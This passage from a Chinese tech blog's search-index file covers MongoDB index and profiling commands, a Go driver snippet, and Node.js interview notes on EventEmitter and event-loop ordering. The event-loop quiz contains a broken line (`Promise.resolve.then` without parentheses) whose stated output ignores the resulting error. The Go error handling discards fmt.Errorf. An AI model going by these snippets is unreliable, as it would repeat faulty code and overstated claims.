class="line">]</span><br></pre></td></tr></table></figure></li><li><p>删除索引</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除索引</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">four</span>.<span class="title function_">dropIndex</span>(<span class="params"><span class="string">&quot;num_1&quot;</span></span>)</span><br><span class="line">&#123; <span class="attr">nIndexesWas</span>: <span class="number">2</span>, <span class="attr">ok</span>: <span class="number">1</span> &#125;</span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">four</span>.<span class="title function_">getIndexes</span>()</span><br><span class="line">[ &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">_id</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;_id_&#x27;</span> &#125; ]</span><br></pre></td></tr></table></figure></li></ul><h3 id="组合索引"><a href="#组合索引" class="headerlink" title="组合索引"></a>组合索引</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建组合索引</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">four</span>.<span class="title function_">createIndex</span>(&#123;<span class="string">&quot;num&quot;</span>: <span class="number">1</span>, <span class="string">&quot;name&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">num_1_name_1</span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">four</span>.<span class="title function_">getIndexes</span>()</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">_id</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;_id_&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">num</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;num_1_name_1&#x27;</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="多值索引（组合索引）"><a href="#多值索引（组合索引）" class="headerlink" title="多值索引（组合索引）"></a>多值索引（组合索引）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入测试数据</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">five</span>.<span class="title function_">insert</span>(<span class="params">&#123;name: <span class="string">&quot;martin&quot;</span>, tag: [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>]&#125;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">acknowledged</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">insertedIds</span>: &#123; <span class="string">&#x27;0&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d8a8ef6e0bc9a3ecdf506&#x27;</span>) &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建多值索引</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">five</span>.<span class="title function_">createIndex</span>(&#123;<span class="attr">tag</span>: <span class="number">1</span>&#125;)</span><br><span class="line">tag_1</span><br><span class="line"><span class="comment">// 查询数据</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">five</span>.<span class="title function_">find</span>(&#123;<span class="attr">tag</span>: <span class="string">&quot;b&quot;</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d8a8ef6e0bc9a3ecdf506&#x27;</span>),</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;martin&#x27;</span>,</span><br><span class="line">    <span class="attr">tag</span>: [ <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建全文索引（name字段）, 一个集合最多创建一个全文索引</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">five</span>.<span class="title function_">createIndex</span>(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;text&quot;</span>&#125;)</span><br><span class="line">name_text</span><br><span class="line"><span class="comment">// 获取索引</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">five</span>.<span class="title function_">getIndexes</span>()</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">_id</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;_id_&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">tag</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;tag_1&#x27;</span> &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">v</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">key</span>: &#123; <span class="attr">_fts</span>: <span class="string">&#x27;text&#x27;</span>, <span class="attr">_ftsx</span>: <span class="number">1</span> &#125;,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;name_text&#x27;</span>,</span><br><span class="line">    <span class="attr">weights</span>: &#123; <span class="attr">name</span>: <span class="number">1</span> &#125;,</span><br><span class="line">    <span class="attr">default_language</span>: <span class="string">&#x27;english&#x27;</span>,</span><br><span class="line">    <span class="attr">language_override</span>: <span class="string">&#x27;language&#x27;</span>,</span><br><span class="line">    <span class="attr">textIndexVersion</span>: <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建哈希索引, 哈希索引不支持范围索引并且不支持多键哈希</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">five</span>.<span class="title function_">createIndex</span>(&#123;<span class="attr">name</span>: <span class="string">&quot;hashed&quot;</span>&#125;)</span><br><span class="line">name_hashed</span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">five</span>.<span class="title function_">getIndexes</span>()</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">_id</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;_id_&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">tag</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;tag_1&#x27;</span> &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">v</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">key</span>: &#123; <span class="attr">_fts</span>: <span class="string">&#x27;text&#x27;</span>, <span class="attr">_ftsx</span>: <span class="number">1</span> &#125;,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;name_text&#x27;</span>,</span><br><span class="line">    <span class="attr">weights</span>: &#123; <span class="attr">name</span>: <span class="number">1</span> &#125;,</span><br><span class="line">    <span class="attr">default_language</span>: <span class="string">&#x27;english&#x27;</span>,</span><br><span class="line">    <span class="attr">language_override</span>: <span class="string">&#x27;language&#x27;</span>,</span><br><span class="line">    <span class="attr">textIndexVersion</span>: <span class="number">3</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">name</span>: <span class="string">&#x27;hashed&#x27;</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;name_hashed&#x27;</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="地理位置索引"><a href="#地理位置索引" class="headerlink" title="地理位置索引"></a>地理位置索引</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加测试数据</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">six</span>.<span class="title function_">insertMany</span>(<span class="params">[&#123;loc: [<span class="number">9</span>, <span class="number">9</span>]&#125;, &#123;loc: [<span class="number">11</span>, <span class="number">11</span>]&#125;, &#123;loc: [<span class="number">100</span>, <span class="number">100</span>]&#125;]</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">acknowledged</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">insertedIds</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d8d75f6e0bc9a3ecdf507&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d8d75f6e0bc9a3ecdf508&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d8d75f6e0bc9a3ecdf509&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建地理位置索引</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">six</span>.<span class="title function_">createIndex</span>(&#123;<span class="attr">loc</span>: <span class="string">&quot;2d&quot;</span>&#125;)</span><br><span class="line">loc_2d</span><br><span class="line"><span class="comment">// 查询在[10, 10]~[12, 12]之间的数据</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">six</span>.<span class="title function_">find</span>(&#123;<span class="attr">loc</span>: &#123;<span class="attr">$geoWithin</span>: &#123;<span class="attr">$box</span>: [[<span class="number">10</span>, <span class="number">10</span>], [<span class="number">12</span>, <span class="number">12</span>]]&#125;&#125;&#125;)</span><br><span class="line">[ &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d8d75f6e0bc9a3ecdf508&#x27;</span>), <span class="attr">loc</span>: [ <span class="number">11</span>, <span class="number">11</span> ] &#125; ]</span><br></pre></td></tr></table></figure><h2 id="MongoDB查询计划"><a href="#MongoDB查询计划" class="headerlink" title="MongoDB查询计划"></a>MongoDB查询计划</h2><h2 id="MongoDB慢查询"><a href="#MongoDB慢查询" class="headerlink" title="MongoDB慢查询"></a>MongoDB慢查询</h2><ul><li>查看是否开启慢查询<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="title function_">getProfilingStatus</span>(<span class="params"></span>)</span><br><span class="line">&#123; <span class="attr">was</span>: <span class="number">0</span>, <span class="attr">slowms</span>: <span class="number">100</span>, <span class="attr">sampleRate</span>: <span class="number">1</span>, <span class="attr">ok</span>: <span class="number">1</span> &#125;</span><br><span class="line"><span class="comment">// was: 表示级别 0 - 不开启 1 - 记录慢查询（默认&gt;100ms） 2 - 记录所有命令</span></span><br><span class="line"><span class="comment">// slowms: 表示慢查询时间设定值</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Go操作MongoDB"><a href="#Go操作MongoDB" class="headerlink" title="Go操作MongoDB"></a>Go操作MongoDB</h2><ul><li><p>创建连接</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MongoDB连接配置</span></span><br><span class="line">client, err := mongo.NewClient(options.Client().ApplyURI(<span class="string">&quot;xxx&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误判断</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  fmt.Errorf(<span class="string">&quot;client establish failed, err: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 超时控制</span></span><br><span class="line">ctx, cancel := context.WithTimeout(context.Background(), <span class="number">10</span> * time.Second)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="keyword">if</span> err = client.Connect(ctx); err == <span class="literal">nil</span> &#123;</span><br><span class="line">  fmt.Println(<span class="string">&quot;connect to db success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接database</span></span><br><span class="line">db := client.Database(<span class="string">&quot;Martin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取集合名</span></span><br><span class="line">collectionNames, err := db.ListCollectionNames(ctx, bson.M&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  fmt.Errorf(<span class="string">&quot;err: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出集合名</span></span><br><span class="line">fmt.Println(<span class="string">&quot;collectionNames: &quot;</span>, collectionNames)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 断开连接</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> err = client.Disconnect(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="built_in">panic</span>(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建文档</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入当行文档</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NodeJS八股文</title>
      <link href="/21f5d73e.html"/>
      <url>/21f5d73e.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>记录NodeJS八股文</p></div><span id="more"></span><h3 id="说说对Node-js的理解？优缺点？应用场景？"><a href="#说说对Node-js的理解？优缺点？应用场景？" class="headerlink" title="说说对Node.js的理解？优缺点？应用场景？"></a>说说对Node.js的理解？优缺点？应用场景？</h3><h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><ul><li>开源与跨平台的<code>JavaScript</code>运行时环境</li><li>在浏览器外运行V8 JavaScript引擎（Google Chrome的内核）, 利用事件驱动、非阻塞和异步输入输出模型等技术提高性能;</li></ul><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul><li>处理高并发场景性能更佳;</li><li>适合I&#x2F;O密集型应用;</li></ul><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul><li>单线程, 不适合CPU密集型应用;</li><li>只支持单核CPU, 不能充分利用CPU;</li><li>可靠性低, 一旦代码某个环节崩溃, 整个系统都崩溃;</li></ul><h3 id="说说Node中的EventEmitter？如何实现一个EventEmitter？"><a href="#说说Node中的EventEmitter？如何实现一个EventEmitter？" class="headerlink" title="说说Node中的EventEmitter？如何实现一个EventEmitter？"></a>说说Node中的EventEmitter？如何实现一个EventEmitter？</h3><p><code>Node</code>采用了事件驱动机制, 而<code>EventEmitter</code>就是实现事件驱动的基础;</p><p>在<code>EventEmitter</code>的基础上, <code>Node</code>几乎所有的模块都继承了这个类, 这些模块拥有了自己的事件, 可以绑定&#x2F;触发监听器, 实现了异步操作;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现一个自定义event</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">EventEmitter</span> = <span class="built_in">require</span>(<span class="string">&#x27;events&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyEmitter</span> <span class="keyword">extends</span> <span class="title class_ inherited__">EventEmitter</span>&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> myEmitter = <span class="keyword">new</span> <span class="title class_">MyEmitter</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;触发了event事件&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myEmitter.<span class="title function_">on</span>(<span class="string">&#x27;event&#x27;</span>, callback);</span><br><span class="line">myEmitter.<span class="title function_">emit</span>(<span class="string">&#x27;event&#x27;</span>);</span><br><span class="line">myEmitter.<span class="title function_">removeListener</span>(<span class="string">&#x27;event&#x27;</span>, callback);</span><br></pre></td></tr></table></figure><h3 id="EventLoop在浏览器与NodeJS的区别"><a href="#EventLoop在浏览器与NodeJS的区别" class="headerlink" title="EventLoop在浏览器与NodeJS的区别"></a>EventLoop在浏览器与NodeJS的区别</h3><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ul><li><code>NodeJS版本 &gt;= 11</code>之后就和浏览器保持一致;</li><li><code>NodeJS版本 &lt;= 10</code>, 浏览器和NodeJS环境下, 在microtask(微任务)任务队列的执行时机不同, 有不同的效果;</li></ul><h4 id="看题"><a href="#看题" class="headerlink" title="看题"></a>看题</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;children2&#x27;</span>);</span><br><span class="line">        <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;children2-1&#x27;</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;children3&#x27;</span>);</span><br><span class="line">        <span class="title class_">Promise</span>.<span class="property">resolve</span>.<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;children3-1&#x27;</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>();</span><br></pre></td></tr></table></figure><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node &gt;= 11 &amp;&amp; 浏览器</span></span><br><span class="line">children2 children2-<span class="number">1</span> children3 children3-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// node &lt;= 10</span></span><br><span class="line">children2 children3 children2-<span class="number">1</span> children3-<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h4><blockquote><p>我们就记住浏览器的EventLoop的机制就可以, 如果问到在NodeJS环境下的执行是什么, 我们可以来解析一下</p></blockquote><ol><li>在<code>NodeJS 版本 &gt;= 11</code> 以及浏览器下</li></ol><ul><li>执行test函数;</li><li>执行第一个setTimeout, 放入到宏任务中;</li><li>执行第二个setTimeout, 放入到宏任务中;</li><li>此刻微任务里面没有任务, 那么执行宏任务, 从队列的头部取出一个宏任务(第一个setTimeout);</li><li>打印children2, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面;</li><li>接下来我们发现微任务里面有任务了, 取微任务里面的任务, 打印出children2-1;</li><li>此刻微任务里面没有任务, 那么继续执行宏任务, 从任务队列的头部取出一个宏任务(第二个setTimeout);</li><li>打印children3, 此刻遇见Promise的then, 是微任务, 放入微任务队列里面;</li><li>接下来我们发现微任务里面有任务了, 取微任务里面的任务, 打印children3-1;</li></ul><ol start="2"><li>在<code>NodeJS版本 &lt;= 10</code>下</li></ol><ul><li>执行test函数;</li><li>执行第一个setTimeout, 放入到宏任务里面;</li><li>执行第二个setTimeout, 放入到宏任务里面;</li><li>此刻微任务里面没有任务, 那么执行宏任务, 从队列的头部取出一个宏任务(第一个setTimeout);</li><li>打印children2, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面;</li><li>注意注意！！！此刻将会继续从队列的头部取出一个宏任务(第二个setTimeout);</li><li>打印children3, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面;</li><li>此刻微任务队列里有2个任务, 依次取出执行children2-1 children3-1;</li></ul><h4 id="大白话"><a href="#大白话" class="headerlink" title="大白话"></a>大白话</h4><div class="note info"><p><strong></strong></p><p>它们的主要区别是执行微任务的时机不同, 假如此刻宏任务有2个任务AB, 此刻微任务队列什么都没有。如果是<code>NodeJS版本 &lt;= 10</code>下, 在执行A任务的时候产生了微任务W, A任务执行完毕, 那么会继续执行B, B执行完成之后再去执行微任务。而<code>NodeJS版本 &gt;= 11 &amp;&amp; 浏览器</code>执行A任务, 产生了微任务, A执行完之后要去执行微任务。</p></div><h3 id="简述什么是EventEmitter？"><a href="#简述什么是EventEmitter？" class="headerlink" title="简述什么是EventEmitter？"></a>简述什么是EventEmitter？</h3><p>EventEmitter是Node.js中的一个核心模块, 主要用于处理事件相关的操作。它是事件驱动编程模式的一个实现, 提供了一种机制, 允许对象（也被事件发射器）发布（emit）事件, 而其他对象（也被称为监听器）可以订阅这些事件并定义当这些事件发生时应该执行的回调函数;</p><p>EventEmitter的主要功能包括事件的注册和监听、事件触发与传递参数, 以及事件的移除。通过调用EventEmitter的on或addListener方法, 可以将事件监听器绑定到特定的事件上。当使用EventEmitter的emit方法触发特定的事件时, 所有注册到该事件的监听器将会按照注册的顺序被调用, 并且可以传递参数给事件监听器。此外, 通过调用removeListener方法, 可以在不需要时移除特定事件的监听器;</p><p>EventEmitter是一种发布-订阅模式的实现, 也是一种观察者模式的实现。它充当了事件调度中心的角色, 是Node.js中实现异步操作的关键组件之一。</p><h3 id="如何实现一个EventEmitter？"><a href="#如何实现一个EventEmitter？" class="headerlink" title="如何实现一个EventEmitter？"></a>如何实现一个EventEmitter？</h3><h4 id="什么是EventEmitter？"><a href="#什么是EventEmitter？" class="headerlink" title="什么是EventEmitter？"></a>什么是EventEmitter？</h4><p>在Node.js中, <code>EventEmitter</code>是事件驱动的基础, 几乎所有模块都继承自它。它实现了观察者模式, 其中被观察者维护一组观察者, 并在更新时通知观察者;</p><p><code>EventEmitter</code>允许对象绑定和触发事件监听器, 实现异步操作。在Node.js中, 许多对象都会分发事件, 例如<code>fs.readStream</code>对象会在文件被打开时触发一个事件;</p><h4 id="使用EventEmitter"><a href="#使用EventEmitter" class="headerlink" title="使用EventEmitter"></a>使用EventEmitter</h4><p>Node.js的<code>events</code>模块提供了一个<code>EventEmitter</code>类, 可以通过继承它创建自定义事件对象。</p><p>基本使用方法如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">EventEmitter</span> = <span class="built_in">require</span>(<span class="string">&#x27;events&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyEmitter</span> <span class="keyword">extends</span> <span class="title class_ inherited__">EventEmitter</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myEmitter = <span class="keyword">new</span> <span class="title class_">MyEmitter</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;触发了event事件&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myEmitter.<span class="title function_">on</span>(<span class="string">&#x27;event&#x27;</span>, callback);</span><br><span class="line">myEmitter.<span class="title function_">emit</span>(<span class="string">&#x27;event&#x27;</span>);</span><br><span class="line">myEmitter.<span class="title function_">removeListener</span>(<span class="string">&#x27;event&#x27;</span>, callback);</span><br></pre></td></tr></table></figure><p><code>EventEmitter</code>的常用方法有：</p><ul><li><code>on(eventName, listener)</code>：添加类型为<code>eventName</code>的事件监听器;</li><li><code>once(eventName, listener)</code>：添加类型为<code>eventName</code>的事件监听器, 但只能执行一次, 执行后将被删除;</li><li><code>prependListener(eventName, listener)</code>：添加类型为<code>eventName</code>的事件监听器到事件数组头部;</li><li><code>emit(eventName, ...args)</code>：触发类型为<code>eventName</code>的事件监听器;</li><li><code>removeListener(eventName, listener)</code>：移除类型为<code>eventName</code>的事件监听器;</li></ul><h4 id="实现自定义EventEmitter"><a href="#实现自定义EventEmitter" class="headerlink" title="实现自定义EventEmitter"></a>实现自定义EventEmitter</h4><p>我们可以简单实现一个<code>EventEmitter</code>类, 了解其基本原理。在实现过程中, 需要维护一个包含所有事件的对象<code>events</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 